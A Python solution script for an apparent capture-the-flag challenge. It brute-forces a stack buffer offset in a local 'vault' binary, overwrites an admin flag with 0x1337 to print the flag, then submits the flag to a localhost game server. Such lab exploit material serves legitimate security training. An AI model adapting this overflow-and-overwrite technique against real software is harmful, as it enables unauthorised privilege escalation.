import sys
import subprocess
import struct
import requests
import platform
import os
import time

# CONFIGURATION
GAME_SERVER = "http://localhost:3000/submit"
TEAM_NAME = "RedTeam" 

def get_target_binary():
    """Detects OS and finds the correct binary path relative to this script"""
    system_os = platform.system()
    
    # 1. Get the directory where THIS script is located (ROOT/solutions/)
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    # 2. Construct path to the challenge folder
    #    Logic: Go up one level (..) -> challenges -> 01-binary-pwn
    challenge_dir = os.path.abspath(os.path.join(script_dir, "..", "challenges", "01-binary-pwn"))
    
    if system_os == "Windows":
        binary_name = "vault.exe"
    else: # Linux / MacOS
        binary_name = "vault"
        
    # 3. Combine to get full path
    target_path = os.path.join(challenge_dir, binary_name)

    # 4. Check if it exists
    if not os.path.exists(target_path):
        print(f"[!] Error: Binary not found at:")
        print(f"    {target_path}")
        print("    Did you run the build script in the 'scripts' folder?")
        sys.exit(1)
        
    return target_path

def attempt_exploit(binary_path, padding_length):
    """Tries to exploit the binary with a specific padding size"""
    
    # 1. Construct Payload
    #    [ Padding 'A's ] + [ Overwrite 'is_admin' to 0x1337 ]
    padding = b"A" * padding_length
    overwrite_value = struct.pack("<I", 0x1337) 
    payload = padding + overwrite_value
    
    # 2. Run Process
    try:
        process = subprocess.Popen(
            [binary_path],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # 3. Send Payload
        #    timeout is important so Windows doesn't hang if the process crashes silently
        stdout, stderr = process.communicate(input=payload + b"\n", timeout=2)
        
        output = stdout.decode('utf-8', errors='ignore')
        
        # 4. Check for Success
        if "CTF{" in output:
            return output
            
    except Exception as e:
        pass # Process might crash due to bad memory access, ignore and retry next padding

    return None

def run_attack():
    target = get_target_binary()
    print(f"[*] Detected OS: {platform.system()}")
    print(f"[*] Target Binary: {target}")
    
    print("[*] Starting Smart-Bruteforce for Buffer Offset...")
    
    # Loop from 64 (standard) up to 84.
    # Windows compilers sometimes align stack memory to 16 bytes.
    for size in range(64, 84, 4): # Step by 4 bytes (size of int)
        print(f"    -> Trying padding size: {size} bytes...", end="\r")
        
        result = attempt_exploit(target, size)
        
        if result:
            print(f"\n[+] SUCCESS! Offset found at {size} bytes.")
            
            # Extract Flag
            start_index = result.find("CTF{")
            end_index = result.find("}", start_index) + 1
            flag = result[start_index:end_index]
            
            print(f"[+] PWNED! Found Flag: {flag}")
            return flag

    print("\n[-] Exploit Failed. Could not find correct offset.")
    return None

def submit_to_server(flag):
    if not flag: return

    print(f"[*] Submitting to Game Server: {GAME_SERVER}")
    try:
        data = {"team_name": TEAM_NAME, "flag": flag}
        r = requests.post(GAME_SERVER, json=data)
        if r.status_code == 200:
            print(f"[+] Server Accepted: {r.text}")
        else:
            print(f"[!] Server Rejected: {r.status_code} | {r.text}")
    except Exception as e:
        print(f"[!] Server connection failed (Is 'cargo run' active?): {e}")

if __name__ == "__main__":
    found_flag = run_attack()
    if found_flag:
        submit_to_server(found_flag)